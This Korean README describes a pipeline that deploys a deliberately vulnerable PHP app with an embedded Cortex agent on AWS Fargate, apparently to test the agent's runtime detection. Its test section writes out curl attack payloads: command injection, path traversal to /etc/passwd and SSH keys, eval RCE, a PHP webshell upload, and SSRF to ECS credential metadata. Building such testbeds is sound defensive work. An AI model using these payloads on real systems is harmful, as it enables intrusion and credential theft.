# fargate-cortex-agent

AWS ECS Fargate에 Cortex CaaS(Container-as-a-Service) 에이전트가 임베디드된 컨테이너를 배포하는 3-스테이지 GitOps 파이프라인. 워크로드는 **에이전트의 런타임 보호 기능을 검증하기 위한 의도적으로 취약한 PHP 테스트베드**입니다.

> ⚠️ **본 워크로드는 의도적으로 취약합니다.** ALB 인그레스가 단일 테스터 IP로 제한된 상태에서만 운영하세요. 공용 노출 시 자동 스캐너에 즉시 악용됩니다.

인프라(VPC/ALB/ECS/ECR)는 CloudFormation으로, 빌드·배포는 GitHub Actions(OIDC 인증)로 처리합니다.

## 아키텍처

```
                        ┌──────────────────────────────────┐
                        │       GitHub repository           │
                        │                                   │
   push to main ───────▶│  .github/workflows/               │
                        │    01-create-cluster.yml          │
                        │    02-build-push.yml ─┐           │
                        │    03-deploy-service.yml          │
                        └──────────────────────────────────┘
                                                 │
                                workflow_call    │  OIDC AssumeRole
                                                 ▼
                        ┌──────────────────────────────────┐
                        │             AWS                   │
                        │                                   │
                        │   ECR ◀── Build & push image      │
                        │    │                              │
                        │    │       (멀티스테이지 빌드:      │
                        │    │        Cortex agent layer    │
                        │    │        + PHP-FPM + nginx)    │
                        │    ▼                              │
                        │   ECS Fargate Service             │
                        │   (PID 1 = Cortex /initd)         │
                        │   (SYS_PTRACE, 2 vCPU / 4 GB)     │
                        │    │                              │
                        │    ▼                              │
                        │   ALB (59.10.109.178/32 only)     │
                        └──────────────────────────────────┘
```

컨테이너 내부 부팅 순서:

```
ECS 시작
  └─ /initd (PID 1, Cortex agent)
       ├─ pre-start.d 4개 스크립트
       ├─ trapsd / pmd 에이전트 데몬 기동
       ├─ Cortex 백엔드 등록 + 정책 수신 (30~120초)
       └─ /etc/panw/dypd_entry 읽어 exec
            └─ supervisord
                 ├─ nginx (HTTP, FastCGI proxy)
                 └─ php-fpm (취약 앱 실행)
```

## 디렉터리 구조

```
.
├── app/                              # 컨테이너 소스
│   ├── Dockerfile                    # php:8.3-fpm-bookworm + Cortex 멀티스테이지
│   ├── nginx.conf                    # PHP-FPM 프록시 + /health
│   ├── supervisord.conf              # nginx + php-fpm 동시 supervise
│   ├── index.php                     # 취약점 엔드포인트 랜딩 페이지
│   ├── vuln/                         # 의도적 취약점
│   │   ├── cmd.php                   #   OS command injection
│   │   ├── lfi.php                   #   path traversal / LFI
│   │   ├── eval.php                  #   PHP eval RCE
│   │   ├── upload.php                #   unrestricted file upload
│   │   ├── ssrf.php                  #   server-side request forgery
│   │   └── info.php                  #   phpinfo() 정보 노출
│   └── .dockerignore
├── infrastructure/
│   ├── cluster.yaml                  # Stage 1: VPC + ECS + ECR + ALB + IAM + Logs
│   └── service.yaml                  # Stage 3: TaskDefinition + Service
└── .github/workflows/
    ├── 01-create-cluster.yml         # CloudFormation ChangeSet 기반 클러스터 배포
    ├── 02-build-push.yml             # Docker Buildx → ECR push → Stage 3 호출
    └── 03-deploy-service.yml         # 서비스 배포 + ALB healthy 대기
```

## 파이프라인 흐름

| 스테이지 | 트리거 | 산출물 |
|---|---|---|
| **Stage 1** | `infrastructure/cluster.yaml` 변경 push, 또는 수동 | `fargate-nginx-cluster` CFN 스택 (VPC, ECS Cluster, ECR, ALB, TargetGroup, IAM Role, LogGroup) |
| **Stage 2** | `app/**` 변경 push, 또는 수동 | ECR 이미지 `:<short-sha>` + `:latest` (Cortex 에이전트 임베디드) |
| **Stage 3** | Stage 2가 `workflow_call`로 자동 호출, 또는 수동 | `fargate-nginx-service` CFN 스택, ALB로 라우팅 |

## Cortex CaaS 에이전트 임베디드 방식

API 자동화 대신 **수동 distribution + Dockerfile 하드코딩** 방식입니다.

### 임베디드 메커니즘

`app/Dockerfile`의 두 위치에 같은 `distribution_id`가 들어갑니다:

```dockerfile
# 1. 멀티스테이지 베이스
FROM distributions.traps.paloaltonetworks.com/agent-docker-pull/<distribution_id>/method:9.2.0.86 AS cortex_agent

# 2. 런타임 식별
ENV XDR_DISTRIBUTION_ID="<distribution_id>"
```

ENTRYPOINT 가로채기:

```dockerfile
RUN ln -sf /opt/traps/bin/initd /initd
RUN mkdir -p /etc/panw && \
    echo '["/usr/bin/supervisord", "-c", "/etc/supervisor/conf.d/services.conf"]' \
      > /etc/panw/dypd_entry && chmod 666 /etc/panw/dypd_entry
ENTRYPOINT ["/initd"]
```

`/initd`가 PID 1을 차지 → 에이전트 초기화 완료 후 `dypd_entry`의 JSON 배열을 exec → supervisord가 nginx + php-fpm 기동.

### distribution_id 회전 절차

1. Cortex 콘솔에서 `caas_embedded` 패키지 생성 (`Endpoints → Agent Installations → + New`)
2. 콘솔이 제공하는 샘플 Dockerfile에서 `agent-docker-pull/<id>/method:<ver>`의 `<id>` 추출
3. `app/Dockerfile` **두 위치 모두** 그 ID로 수정 (FROM 라인과 `XDR_DISTRIBUTION_ID` env)
4. `main`에 push → Stage 2 → Stage 3 자동 실행

> 두 위치가 어긋나면 에이전트가 다른 distribution으로 자신을 등록해 백엔드 매칭 실패 → 부팅 멈춤.

## 의도적 취약점 목록

| 엔드포인트 | 취약점 종류 | Cortex가 잡아야 할 행위 |
|---|---|---|
| `GET /vuln/cmd.php?c=...` | OS command injection | `/bin/sh`, `bash`, `nc`, `wget` 자식 프로세스 spawn |
| `GET /vuln/lfi.php?file=...` | Path traversal / LFI | `/etc/passwd`, `/etc/secrets/*`, `/root/.ssh/id_rsa` 읽기 |
| `GET /vuln/eval.php?code=...` | PHP eval RCE | 임의 PHP 실행 |
| `POST /vuln/upload.php` | Unrestricted upload | 웹쉘 업로드 → 후속 RCE 체인 |
| `GET /vuln/ssrf.php?url=...` | SSRF | `169.254.170.2` (ECS Task metadata) 등 |
| `GET /vuln/info.php` | Info disclosure | `phpinfo` 환경 누설 |

빌드 시 데코이 파일(가짜 값)이 사전 배치됨:

- `/etc/secrets/aws.env`
- `/etc/secrets/api_key.txt`
- `/root/.ssh/id_rsa`

## 최초 설정 (한 번만)

### 1. AWS OIDC Provider 등록

```bash
aws iam create-open-id-connect-provider \
  --url https://token.actions.githubusercontent.com \
  --client-id-list sts.amazonaws.com \
  --thumbprint-list 6938fd4d98bab03faadb97b34396831e3780aea1
```

### 2. 배포용 IAM Role 생성

GitHub Actions가 Assume할 Role에 다음 권한 부여:
- 인프라 서비스: `cloudformation:*`, `ec2:*`, `elasticloadbalancing:*`, `ecs:*`, `ecr:*`, `logs:*`
- IAM(Task Role 생성용): `fargate-nginx-task-*` 범위로 제한

Trust policy `sub` 조건: `repo:<OWNER>/<REPO>:*`

### 3. GitHub Secret 등록

필수:
```bash
gh secret set AWS_DEPLOY_ROLE_ARN \
  --repo <OWNER>/<REPO> \
  --body "arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME>"
```

선택 (현재 사용처 없음 — 향후 API 자동화 재시도용으로 보존):
- `CORTEX_FQDN`
- `CORTEX_API_KEY`
- `CORTEX_API_KEY_ID`

### 4. ALB 인그레스 IP 변경

`infrastructure/cluster.yaml`의 `AlbSecurityGroup` 인그레스 CIDR을 본인 IP로:

```yaml
SecurityGroupIngress:
  - IpProtocol: tcp
    FromPort: 80
    ToPort: 80
    CidrIp: <YOUR_PUBLIC_IP>/32
```

### 5. (선택) Environment 보호 게이트

`Settings → Environments → New environment → production` 으로 승인자/브랜치 제한을 걸 수 있습니다.

## 배포 실행

### 첫 배포 순서

```bash
# 1. 인프라
gh workflow run "Stage 1 - Create ECS Cluster" --ref main

# 2. 이미지 빌드 → 자동으로 Stage 3까지 진행
gh workflow run "Stage 2 - Build & Push Image" --ref main
```

### 일상 배포

`app/` 아래 코드를 수정해 `main`에 push하면 Stage 2 → Stage 3이 자동 실행됩니다. distribution_id 회전 시에도 동일.

### 수동 재배포 / 롤백

특정 이미지 태그로 되돌리기:
```bash
gh workflow run "Stage 3 - Deploy ECS Service" --ref main \
  -f image_tag=<short-sha>
```

> Stage 3의 ALB 스모크 테스트는 `continue-on-error`입니다 (GitHub Actions runner IP가 ALB 화이트리스트에 없어 항상 차단되기 때문). TG 헬스 검증은 강제됩니다.

## 취약점 동작 시험 (본인 IP에서만)

```bash
ALB=http://fargate-nginx-alb-1594839797.ap-northeast-2.elb.amazonaws.com

# 랜딩
curl "$ALB/"

# 1) Command injection - 자식 프로세스 spawn
curl "$ALB/vuln/cmd.php?c=id"
curl "$ALB/vuln/cmd.php?c=cat%20/etc/secrets/aws.env"

# 2) LFI - 데코이 SSH 키 / passwd 읽기
curl "$ALB/vuln/lfi.php?file=../../../etc/passwd"
curl "$ALB/vuln/lfi.php?file=../../../root/.ssh/id_rsa"

# 3) eval RCE
curl "$ALB/vuln/eval.php?code=system('whoami');"

# 4) Webshell 업로드 + 실행
echo '<?php system($_GET["x"]);' > /tmp/s.php
curl -F 'f=@/tmp/s.php' "$ALB/vuln/upload.php"
curl "$ALB/uploads/s.php?x=uname%20-a"

# 5) SSRF - ECS Task metadata
curl "$ALB/vuln/ssrf.php?url=http://169.254.170.2/v2/credentials/"

# 6) phpinfo
curl "$ALB/vuln/info.php"
```

각 시도 후 Cortex 콘솔 → Incidents / Alerts에서 어떻게 잡히는지 확인합니다.

## 운영

### 엔드포인트 / 클러스터 정보 확인
```bash
aws cloudformation describe-stacks --stack-name fargate-nginx-cluster \
  --query "Stacks[0].Outputs" --output table
```

### 실시간 컨테이너 로그
```bash
aws logs tail /ecs/fargate-nginx --follow
```

Cortex `/initd`가 PID 1이므로 로그에는 에이전트 메시지(`{initd:...}`, `{trapsd:...}`, `{pmd:...}`)가 다수 섞입니다.

### 서비스 / Task 상태
```bash
aws ecs describe-services --cluster fargate-nginx-cluster --services fargate-nginx-svc \
  --query 'services[0].{Status:status,Desired:desiredCount,Running:runningCount,Deployments:deployments[].rolloutState}' \
  --output table
```

### 컨테이너 내부 진입 (디버깅)

Task Definition에 `enableExecuteCommand: true`가 켜져 있어 ECS Exec 사용 가능:

```bash
TASK=$(aws ecs list-tasks --cluster fargate-nginx-cluster --service-name fargate-nginx-svc \
  --query 'taskArns[0]' --output text)
aws ecs execute-command --cluster fargate-nginx-cluster --task "$TASK" \
  --container nginx --interactive --command "/bin/bash"
```

### 안전장치
- Service `DeploymentCircuitBreaker(Rollback=true)` 활성 → 새 태스크가 안정화되지 않으면 자동 롤백
- `MinimumHealthyPercent=100`, `MaximumPercent=200` → 무중단 롤링 업데이트
- **ALB Target Group**: `/health` 200 응답을 단일 헬스체크로 사용 (컨테이너/Docker 레벨 HealthCheck는 의도적으로 미사용)
- `HealthCheckGracePeriodSeconds: 300` — Cortex 에이전트 등록·정책 수신 + supervisord 핸드오프 시간 확보

## 정리 (스택 삭제)

순서 중요. 서비스 스택을 먼저, 그 다음 클러스터 스택.

```bash
aws cloudformation delete-stack --stack-name fargate-nginx-service
aws cloudformation wait stack-delete-complete --stack-name fargate-nginx-service

aws cloudformation delete-stack --stack-name fargate-nginx-cluster
aws cloudformation wait stack-delete-complete --stack-name fargate-nginx-cluster
```

> ECR 리포지토리에 이미지가 남아있으면 클러스터 스택 삭제가 실패합니다. 콘솔이나 `aws ecr batch-delete-image`로 비우세요.

## 비용 안내

`ap-northeast-2`, Fargate 2 vCPU / 4 GB, ALB 1대, Single task 기준:

- **ALB**: 시간당 약 $0.0225 + LCU
- **Fargate Task (2 vCPU / 4 GB)**: 시간당 약 $0.10 (Cortex 임베디드 요구 사양)
- **NAT Gateway**: 사용 안 함 (Public subnet + AssignPublicIp)
- **ECR**: 스토리지 GB당 월 $0.10 (PHP + Cortex 임베디드 이미지 ≈ 1.5 GB)

테스트가 끝나면 위 "정리" 절차로 모두 삭제하면 추가 과금이 멈춥니다.

## 워크플로 입력 파라미터

세 워크플로 모두 `workflow_dispatch` 입력을 받습니다.

| 입력 | Stage 1 | Stage 2 | Stage 3 | 기본값 |
|---|---|---|---|---|
| `project_name` | ✓ | ✓ | ✓ | `fargate-nginx` |
| `aws_region` | ✓ | ✓ | ✓ | `ap-northeast-2` |
| `auto_deploy` | | ✓ | | `true` |
| `image_tag` | | | ✓ | `latest` |
| `desired_count` | | | ✓ | `1` |

`project_name`을 변경하면 다른 환경(stage/prod 등)으로 분리 배포할 수 있습니다 — 단, 한 워크플로 실행 내에서 모든 스테이지에 동일한 값을 넘기세요.

> Stage 3 워크플로는 `Cpu`/`Memory` 입력을 받지 않으므로 `service.yaml`의 Parameters default를 변경해도 CFN은 기존 값을 유지합니다. 사이즈 변경이 필요하면 `aws cloudformation deploy --parameter-overrides Cpu=... Memory=...`로 명시적 override 필요.
